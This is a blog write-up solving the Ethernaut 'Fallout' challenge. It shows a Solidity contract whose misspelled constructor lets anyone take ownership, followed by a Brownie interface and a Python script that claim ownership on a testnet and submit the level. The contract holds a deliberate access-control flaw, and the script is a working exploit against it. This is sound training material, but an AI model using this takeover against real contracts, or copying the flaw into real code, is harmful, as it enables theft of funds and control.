---
title: "Ethernaut solution 2: Fallout"
pubDate: '2022-07-02T12:00:00Z'
image: {url: 'https://cdn.hashnode.com/res/hashnode/image/upload/v1643939982270/QJAGPa0iu.jpeg', alt: 'Ethernaut Fallout challenge cover image'}
description: Learn how to solve the Ethernaut challenge "Fallout" by exploiting a typo in the constructor function. This step-by-step guide uses Brownie to take ownership of the contract and submit the solution. Perfect for blockchain developers and security enthusiasts.
tags: [brownie, blockchain, smart contracts, python]
language: en
canonicalURL: https://kevdevto.hashnode.dev/ethernaut-solution-2-fallout
---

This second challenge shows us how a simple typo error can be a great mistake that ruins all.

Let's solve it.

First, let's take a look into the code, **we are not going to deep dive into all the code of the contract since this is just a typo error**, and we only need just one function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

Remember in our previous post, when I said that the **solidity constructor used to be named the same as the contract name declaration.**

Example:

```plaintext
// SPDX-License-Identifier: MIT
Pragma solidity 0.4.0;

  contract MyIncredibleAndAwesomeContractWeb3FuckingAmazingMetaverse {
    
    Address owner;
    Uint whatever;
    
  function MyIncredibleAndAwesomeContractWeb3FuckingAmazingMetaverse {
 
  	Owner = msg.sender
  	Whatever = msg.value
  }
  //other functions….
}
```

**Since version 0.5.0 of solidity constructors now have to be defined by the** `constructor` keyword offered by solidity

You can read more [here.](https://medium.com/r/?url=https%3A%2F%2Fdocs.soliditylang.org%2Fen%2Fv0.8.11%2F050-breaking-changes.html%23constructors)

So, *if a constructor*, in olders versions of solidity, *must have the same name as the contract*, **what would happens if we commit a typo in the declaration of the constructor, that mismatch the current name of the contract?** :hushed:

What would happen if that constructor will be now a ordinary, dumb, and boring function, that we can call whenever we want? And if that ordinary, dumb, and boring function have the ability to declare ourselves as the new owner of the contract?. :frowning:

**That is just what happened with this contract.**

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643940589173/oSw_ptPfL.png  )

Did you see it?

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643940607647/ZVEFOfFfN.png  )

Now?

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643940637518/V9I0e2C0h.png  )

What about now?

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643940658554/ZaG8gJLHu.png  )

Heh :v

Exactly, **there is a typo in the constructor declaration** = `Fallout` → `Fal1out`

And results, **that function declares as owner whoever who calls it.** :smiling\_imp:

Well, since we just have to take the ownership of the contract, **we just have to call the misspelling construction function of the contract, to steal the ownership.**

**Let's do it**

We are going to use brownie, so let's create our brownie project.

```plaintext
brownie init
```

If you don't know how to use brownie, [you can check this article written by me](https://kevdevto.hashnode.dev/brownie-everything-you-need-to-know-to-write-test-and-deploy-your-smart-contracts) :bowtie:

First, we need the basics to interact with that contract:

1. Its ab
    
2. Its address
    

Let's create our interface, to be able to grab the abi, in the folder interfaces create a new file and write this:

```plaintext
pragma solidity ^0.6.0;

interface IFallout {
    function Fal1out() external payable;
}
```

Since we are only using one function `Fal1back` , that's the only one that we have to put in the interface declaration.

Okay, now, let's grab the instance address, in the browser console you can see it writing: `instance`.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643940852304/kZkY5IzDx.png  )

Okay, now lets create a script to hack the contract, in our scripts folder lets create a new file

`hack.py`

Let's make the necessary imports

```plaintext
from brownie import interface, accounts, config
```

Let's grab our account and store the instance contract address

```plaintext
from brownie import interface, accounts, config

INSTANCE_ADDRESS = "0xfaAB33fe1AbD3770E225De9FdC9588C98F573f68"
ACCOUNT = accounts.add(config["wallets"]["from_key"])
```

And lets make our function to hack the contract.

```plaintext

def hack():
    instance_contract = interface.IFallout(INSTANCE_ADDRESS)
    instance_contract.Fal1out(
      {"from": ACCOUNT, "value": 0.000000000000000001}
    )
    print(
      f"Contract has been hacked. The new owner now is {instance_contract.owner()}"
    )

def main():
    hack()
```

We just have to grab the contract object using the `interface` [method provided by brownie](https://eth-brownie.readthedocs.io/en/stable/core-contracts.html#using-local-interfaces), and then call `Fal1out`

This would give us the ownership of the contract.

*Let's run this*

```plaintext
$ brownie run scripts/hack.py --network rinkeby
```

**That's it.**

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643941108371/737V5GdKq.png  )

Now, **let's submit the instance to the ethernaut contract.**

**We need the ABI and the address of the ethernaut contract.**

To grab the address just put `ethernaut.address` in the browser console.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643941131858/mi0hIiXMw.png  )

Store the address in a variable

And to grab the abi just grab it from the ethernaut contract object that is in the browser console.

Write `ethernaut` in the browser console.

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643941240365/naNt2QfKL.png  )

And paste it in your file

**Remember to change the** `true` and `false` statement, to add the capital letter `True` `False`

Let's make a function to submit the contract.

```plaintext
def submit_the_contract():
  
    ethernaut_contract = Contract.from_abi(
      "Ethernaut",
      ETHERNAUT_CONTRACT_ADDRESS, 
      ETHERNAUT_ABI)
    print("Submiting instance")
    
    ethernaut_contract.submitLevelInstance(
      INSTANCE_ADDRESS, {"from": ACCOUNT}
    )
    print("Instance submitted. Level passed. WOHOOO!")
    print("refresh the page of ethernaut")


def main():
    submit_the_contract()
```

First grab the contract object using the `Contract.from_abi()` method of brownie.

After that, we just need to call the `submitLevelInstance` Method to submit your instance, passing as arguments the current instance level

```plaintext
brownie run scripts/submit_contract.py --network rinkeby
```

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1643941331614/aUgRsLdj5.png  )

**And, that's it. We just completed the second challenge.** :stuck\_out\_tongue\_closed\_eyes:

You can grab the complete solution in this [github repo](https://medium.com/r/?url=https%3A%2F%2Fgithub.com%2Fmustafinho%2Fethernaut_solutions%2Ftree%2Fmain%2Fethernaut_2_fallout)

If you have any comment or suggestions please leave it in the comments section, also if you see any problem with the code feel free to make a PR.

You can follow me on my twitter [@0bkevin](https://x.com/0bkevin) and DM me, I'm always happy to talk and know more people in this amazing community

**Stay tuned for the next Ethernaut solution:** Coin Flip
